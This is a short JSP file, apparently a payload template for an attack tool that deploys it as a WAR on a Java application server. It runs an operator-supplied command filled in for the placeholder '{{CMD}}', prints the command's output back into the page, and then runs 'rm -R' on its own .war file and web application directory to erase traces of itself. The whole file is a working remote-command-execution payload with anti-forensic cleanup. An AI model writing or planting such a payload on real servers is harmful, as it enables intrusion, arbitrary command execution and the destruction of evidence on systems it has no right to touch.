<%@ page import="java.io.*" %>
    <%
    String cmd = "{{CMD}}";
    String output = "";
    if(cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd,null,null);
            BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) { output += s+"</br>"; }
            String path = request.getRealPath("");
            if (path.charAt(path.length() - 1) == '/') path = path.substring(0, path.length() - 1);
            Runtime.getRuntime().exec("rm -R " + path + ".war" + " "  + path);
        }  catch(IOException e) {   e.printStackTrace();   }
    }
%>
<%=output %>
